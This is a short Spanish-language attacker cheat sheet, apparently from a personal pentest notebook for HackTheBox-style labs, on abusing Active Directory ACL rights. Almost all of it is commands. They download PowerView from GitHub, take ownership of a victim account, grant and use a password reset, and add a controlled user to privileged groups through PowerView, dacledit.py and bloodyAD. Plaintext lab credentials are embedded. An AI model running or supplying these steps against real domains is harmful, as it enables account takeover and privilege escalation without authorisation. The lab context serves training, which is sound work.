
### CON NUESTRO USUARIO
```powershell
#CONTEXTO: TENEMOS PRIVILEGIO WRITE OWNER SOBRE UN USUARIO

#IMPORTAMOS POWERVIEW
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
upload PowerView.ps1

Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom #EN TOM PONEMOS EL USUARIO ACTUAL Y EN CLAIRE EL DE LA VÍCTIMA.
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword #EN CLAIRE LA VICTIMA Y EN TOM NOSOTROS.

#AHORA LE CAMBIAMOS LA CONTRASEÑA.
$cred = ConvertTo-SecureString "Gorka123!" -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $cred
```

### UTILIZANDO OTRO USUARIO SOBRE UN GRUPO
```shell
#CONTEXTO: Otro usuario del que tenemos credenciales tiene el privilegio sobre un grupo.

#CREAMOS EL OBJETO
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity 'JDgodd'
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Credential $Cred
```


### SOBRE UN GRUPO OTRO METODO
```SHELL
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb/judith.mader:judith09'
python3 bloodyAD.py --host 10.129.39.133 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
```

![[Pasted image 20241202174217.png]]